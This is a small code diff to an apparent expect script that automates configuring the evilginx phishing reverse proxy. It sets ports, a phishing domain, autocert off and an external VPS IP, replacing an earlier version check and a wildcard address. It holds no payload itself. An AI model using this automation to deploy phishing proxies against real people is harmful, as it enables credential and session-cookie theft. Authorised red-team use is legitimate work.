@@ -632,8 +632,7 @@ log_user 1
 spawn /usr/local/bin/evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets
 
 expect {
-    "version 3.3.0" {
-        expect -re "evilginx\s+>\s?$"
+    -re "evilginx\s+>\s?$" {
         send "config https_port 8443\r"
         expect -re "evilginx\s+>"
         send "config http_port 8081\r"
@@ -642,7 +641,7 @@ expect {
         expect -re "evilginx\s+>"
         send "config domain $DOMAIN\r"
         expect -re "evilginx\s+>"
-        send "config ipv4 0.0.0.0\r"
+        send "config ipv4 external $VPS_IP\r"
         expect -re "evilginx\s+>"
         send "config autocert off\r"
         expect -re "evilginx\s+>"
